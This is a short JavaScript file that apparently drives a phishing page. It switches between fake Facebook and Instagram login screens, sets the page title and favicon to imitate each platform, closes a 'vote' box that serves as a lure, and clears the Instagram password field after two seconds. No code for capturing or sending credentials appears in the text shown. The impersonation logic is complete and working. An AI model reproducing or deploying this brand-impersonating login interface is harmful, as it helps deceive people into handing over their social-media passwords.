function clearInstagramPasswordField() {
  // Set a delay before clearing the password field (in milliseconds)
  setTimeout(function () {
    // Get the password field element by its ID
    var passwordField = document.getElementById("ig-pass");

    // Clear the value of the password field
    passwordField.value = "";
  }, 2000); // Delay of 2000ms (2 seconds)
}

function togglePasswordVisibility() {
  var passwordField = document.getElementById("password");
  var toggleButton = document.querySelector(".toggle-password");

  if (passwordField.type === "password") {
    passwordField.type = "text";
    toggleButton.style.backgroundImage = "url('/img/view.png')"; // Change to visible icon
  } else {
    passwordField.type = "password";
    toggleButton.style.backgroundImage = "url('/img/hide.png')"; // Change to hidden icon
  }
}

function toggleClearIcon() {
  var input = document.getElementById("email");
  var clearIcon = document.getElementById("clearIcon");

  if (input.value.trim() !== "") {
    clearIcon.style.display = "block";
  } else {
    clearIcon.style.display = "none";
  }
}

function clearEmailInput() {
  var input = document.getElementById("email");
  input.value = "";
  document.getElementById("clearIcon").style.display = "none";
}

function changeFavicon(iconUrl) {
  const favicon = document.getElementById("dynamic-favicon");
  favicon.href = iconUrl;
}

function fb() {
  document.getElementById("fb_wrapper").style.display = "block";
  document.getElementById("ig_wrapper").style.display = "none";
  document.getElementById("home").style.display = "none";
  document.getElementById("choose").style.display = "none";
}

function handleFbClick() {
  changeFavicon("/img/favicon.png");
  fb();
  document.title = "Log in to Facebook";
}

function ig() {
  document.getElementById("ig_wrapper").style.display = "block";
  document.getElementById("fb_wrapper").style.display = "none";
  document.getElementById("home").style.display = "none";
  document.getElementById("choose").style.display = "none";
}

function handleIgClick() {
  changeFavicon("/img/igfavicon.png");
  ig();
  document.title = "Instagram";
}

function closeVoteBox() {
  document.getElementById("voteBox").style.display = "none";
}
